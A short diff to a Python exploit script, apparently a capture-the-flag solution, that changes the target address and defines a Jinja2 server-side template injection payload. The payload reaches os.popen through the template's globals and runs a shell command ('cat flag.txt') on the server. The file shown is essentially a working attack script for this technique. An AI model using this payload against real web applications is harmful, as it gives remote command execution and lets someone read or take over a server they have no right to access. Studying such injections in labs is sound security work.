@@ -1,6 +1,6 @@
 import requests
 
-url = "http://94.237.53.203:59491"
+url = "http://83.136.253.71:46769"
 ssti_payload = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
 
 with requests.Session() as s:
